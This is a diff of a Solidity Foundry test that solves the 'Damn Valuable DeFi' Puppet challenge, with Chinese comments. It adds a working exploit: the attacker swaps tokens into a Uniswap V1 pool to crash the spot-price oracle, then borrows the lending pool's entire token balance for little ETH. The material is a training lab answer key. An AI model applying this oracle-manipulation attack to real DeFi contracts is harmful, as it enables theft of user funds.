@@ -56,10 +56,10 @@ contract Puppet is Test {
         dvt = new DamnValuableToken();
         vm.label(address(dvt), "DVT");
 
-        uniswapV1Factory = UniswapV1Factory(deployCode("./src/build-uniswap/v1/UniswapV1Factory.json"));
+        uniswapV1Factory = UniswapV1Factory(deployCode("./src/Contracts/build-uniswap-v1/UniswapV1Factory.json"));
 
         // Deploy a exchange that will be used as the factory template
-        uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json"));
+        uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/Contracts/build-uniswap-v1/UniswapV1Exchange.json"));
 
         // Deploy factory, initializing it with the address of the template exchange
         uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
@@ -96,14 +96,40 @@ contract Puppet is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+    function testExploit_Puppet() public {
+        uint256 v1PairBalance = dvt.balanceOf(address(puppetPool));
+        console.log("v1PairBalance:", v1PairBalance);
 
-        /**
-         * EXPLOIT END *
+        /* 
+         * 1. 将 eth/dvt 降低，通过swap 9.9 eth，可以考虑将1000e18 dvt注入池子
+         * 2. 将lending pool的钱通过借款借款 
          */
+        emit log("-------------------------- before attack ---------------------------------");
+        
+        uint256 eth1 = calculateTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
+        uint256 eth2 = calculateTokenToEthInputPrice(UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
+        
+        emit log_named_decimal_uint("getTokenToEthInputPrice", uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE), 18);
+        emit log_named_decimal_uint("attacker use ATTACKER_INITIAL_TOKEN_BALANCE to swap eth1", eth1, 18);
+        emit log_named_decimal_uint("attacker use UNISWAP_INITIAL_TOKEN_RESERVE to swap eth1", eth2, 18);
+        
+        uint256 shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
+        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);
+
+        emit log("-------------------------- after attack ---------------------------------");
+        vm.startPrank(attacker);
+        // 1. 将 eth/dvt 降低，通过swap 9.9 eth，可以考虑将1000e18 dvt注入池子
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, block.timestamp + 1 days);
+        shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
+        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);
+
+        // 2. 将lending pool的钱通过借款借款 
+        puppetPool.borrow{value: shouldETH}(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
+        
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
